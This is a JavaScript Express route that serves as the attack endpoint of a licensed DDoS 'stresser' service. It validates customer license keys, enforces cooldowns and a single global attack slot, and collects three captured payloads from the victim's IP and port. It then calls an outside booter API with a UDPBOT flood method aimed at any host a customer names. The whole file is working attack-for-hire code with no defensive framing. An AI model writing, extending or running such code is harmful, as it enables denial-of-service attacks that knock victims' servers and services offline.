/**
 * /api/fire — ONLINE SLOT + COOLDOWN SYSTEM
 *
 * GLOBAL SLOT: Only 1 user can attack at a time across ALL devices.
 * PER-USER COOLDOWN: After attack ends, that specific user must wait before firing again.
 *
 * NEW: requires payload1, payload2, payload3 (first three captured packet payloads
 * from the target ip:port). The upstream stresser is only invoked once all three
 * are present. Active sessions (ip/port/time/payload1/2/3) are tracked in DB and
 * surfaced via /api/soul.
 */
const express = require('express');
const rateLimit = require('express-rate-limit');
const { db } = require('../db/database');

const router = express.Router();

const PROVIDER_BASE = 'https://goofystresse.st/api/external/attack';
const PROVIDER_KEY = process.env.PROVIDER_KEY;
const DEFAULT_COOLDOWN = parseInt(process.env.FIRE_COOLDOWN_SECONDS, 10) || 300;

// ===== schema bootstrap (idempotent) =====
try {
  db.prepare(`CREATE TABLE IF NOT EXISTS active_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_value TEXT,
    ip TEXT,
    port TEXT,
    time TEXT,
    payload1 TEXT,
    payload2 TEXT,
    payload3 TEXT,
    option TEXT,
    started_at TEXT DEFAULT (CURRENT_TIMESTAMP),
    ends_at TEXT
  )`).run();
} catch (_) {}

const fireLimiter = rateLimit({
  windowMs: 60 * 1000, max: 60,
  standardHeaders: true, legacyHeaders: false,
  message: { ok: false, reason: 'rate_limited' }
});

// ========== HELPER FUNCTIONS ==========
function getGlobalState(key) {
  const row = db.prepare("SELECT value FROM global_state WHERE key = ?").get(key);
  return row ? row.value : null;
}
function setGlobalState(key, value) {
  db.prepare(`INSERT INTO global_state (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value`).run(key, value);
}
function isSlotBusy() {
  const lockedUntil = getGlobalState('slot_locked_until');
  if (!lockedUntil) return false;
  return new Date(lockedUntil) > new Date();
}
function getSlotRemaining() {
  const lockedUntil = getGlobalState('slot_locked_until');
  if (!lockedUntil) return 0;
  const remaining = Math.ceil((new Date(lockedUntil) - new Date()) / 1000);
  return Math.max(0, remaining);
}
function lockSlot(durationSeconds, licenseKey) {
  const until = new Date(Date.now() + durationSeconds * 1000).toISOString();
  setGlobalState('slot_locked_until', until);
  const maskedKey = '***' + licenseKey.slice(-4);
  setGlobalState('slot_fired_by', maskedKey);
}
function releaseSlot() {
  setGlobalState('slot_locked_until', null);
  setGlobalState('slot_fired_by', null);
}
function getUserCooldownRemaining(keyValue) {
  const k = db.prepare('SELECT last_fire_at, cooldown_seconds FROM license_keys WHERE key_value = ?').get(keyValue);
  if (!k || !k.last_fire_at) return 0;
  const cd = k.cooldown_seconds || 180;
  const remaining = Math.ceil((new Date(k.last_fire_at).getTime() + cd * 1000 - Date.now()) / 1000);
  return Math.max(0, remaining);
}
function setUserCooldown(_keyValue, _cooldownSeconds) {
  // Cooldown is derived from last_fire_at + cooldown_seconds; nothing extra to persist.
}

// ========== CORE FIRE LOGIC ==========
async function __internalFire(keyRow, params, req) {
  const keyValue = keyRow?.key_value || params?.key || '';
  const ip   = (params?.ip   || '').toString().trim();
  const port = (params?.port || '').toString().trim();
  const time = (params?.time || '').toString().trim();
  const option = (params?.option || '1').toString().trim();
  const payload1 = (params?.payload1 || '').toString().trim();
  const payload2 = (params?.payload2 || '').toString().trim();
  const payload3 = (params?.payload3 || '').toString().trim();

  // STEP 1: Validate params (now includes 3 payloads)
  if (!keyValue || !ip || !port || !time) {
    return { ok: false, reason: 'missing_params' };
  }
  // Wait until all 3 payloads are present before calling upstream API
  if (!payload1 || !payload2 || !payload3) {
    return { ok: false, reason: 'waiting_payloads', need: 3,
             got: [payload1, payload2, payload3].filter(Boolean).length };
  }

  // STEP 2: Re-fetch license row
  const k = db.prepare(`
    SELECT id, key_value, status, expires_at, cooldown_seconds, duration_type
    FROM license_keys WHERE key_value = ?
  `).get(keyValue);

  if (!k) return { ok: false, reason: 'invalid_key' };
  if (k.status === 'revoked') return { ok: false, reason: 'revoked' };
  if (k.duration_type !== 'lifetime' && new Date(k.expires_at) <= new Date()) {
    return { ok: false, reason: 'expired' };
  }

  // STEP 3: Per-user cooldown
  const userCooldownRemaining = getUserCooldownRemaining(keyValue);
  if (userCooldownRemaining > 0) {
    return { ok: false, reason: 'cooldown', cooldown_remaining: userCooldownRemaining };
  }

  // STEP 4: Global slot
  if (isSlotBusy()) {
    return { ok: false, reason: 'slot_busy', slot_remaining: getSlotRemaining(),
             fired_by: getGlobalState('slot_fired_by') };
  }

  // STEP 5: LOCK THE SLOT
  const attackSeconds = Math.max(1, Math.min(parseInt(time, 10) || 60, 3600));
  lockSlot(attackSeconds, keyValue);

  // STEP 5b: record active session
  const endsAt = new Date(Date.now() + attackSeconds * 1000).toISOString();
  let sessionId = null;
  try {
    const ins = db.prepare(`INSERT INTO active_sessions
      (key_value, ip, port, time, payload1, payload2, payload3, option, ends_at)
      VALUES (?,?,?,?,?,?,?,?,?)`)
      .run(keyValue, ip, port, time, payload1, payload2, payload3, option, endsAt);
    sessionId = ins.lastInsertRowid;
  } catch (_) {}

  // STEP 6: Fire upstream stresser (now with payload1/2/3)
  const url = `${PROVIDER_BASE}?key=${encodeURIComponent(PROVIDER_KEY)}` +
              `&host=${encodeURIComponent(ip)}` +
              `&port=${encodeURIComponent(port)}` +
              `&time=${encodeURIComponent(time)}` +
              `&method=UDPBOT&concurrents=1` +
              `&payload1=${encodeURIComponent(payload1)}` +
              `&payload2=${encodeURIComponent(payload2)}` +
              `&payload3=${encodeURIComponent(payload3)}`;

  const ctrl = new AbortController();
  const tmo = setTimeout(() => ctrl.abort(), 8000);

  fetch(url, { method: 'GET', signal: ctrl.signal })
    .then(r => r.text())
    .then(() => {
      try {
        db.prepare(`INSERT INTO api_calls (key_id, key_value, ip, port, duration, upstream_status, ok)
                    VALUES (?, ?, ?, ?, ?, ?, ?)`)
          .run(k.id, keyValue, ip, port, time, 200, 1);
      } catch (_) {}
    })
    .catch(() => {
      try {
        db.prepare(`INSERT INTO api_calls (key_id, key_value, ip, port, duration, upstream_status, ok)
                    VALUES (?, ?, ?, ?, ?, ?, ?)`)
          .run(k.id, keyValue, ip, port, time, 0, 0);
      } catch (_) {}
    })
    .finally(() => clearTimeout(tmo));

  // STEP 7: Release slot + cooldown + delete session after attack duration
  setTimeout(() => {
    releaseSlot();
    const cooldownSecs = (k.cooldown_seconds && k.cooldown_seconds > 0) ? k.cooldown_seconds : DEFAULT_COOLDOWN;
    setUserCooldown(keyValue, cooldownSecs);
    const nowIso = new Date().toISOString();
    try { db.prepare("UPDATE license_keys SET last_fire_at = ? WHERE id = ?").run(nowIso, k.id); } catch (_) {}
    if (sessionId) {
      try { db.prepare('DELETE FROM active_sessions WHERE id = ?').run(sessionId); } catch (_) {}
    }
  }, attackSeconds * 1000);

  return { ok: true, slot_locked_for: attackSeconds, message: 'attack_fired',
           payloads_received: 3 };
}

// ========== ENDPOINT: GET /api/fire ==========
router.get('/', fireLimiter, async (req, res) => {
  const params = {
    key:  (req.query.key  || '').toString().trim(),
    ip:   (req.query.ip   || '').toString().trim(),
    port: (req.query.port || '').toString().trim(),
    time: (req.query.time || '').toString().trim(),
    option: (req.query.option || '1').toString().trim(),
    payload1: (req.query.payload1 || '').toString().trim(),
    payload2: (req.query.payload2 || '').toString().trim(),
    payload3: (req.query.payload3 || '').toString().trim(),
  };
  const result = await __internalFire(null, params, req);
  return res.json(result);
});

module.exports = router;
module.exports.__internalFire = __internalFire;
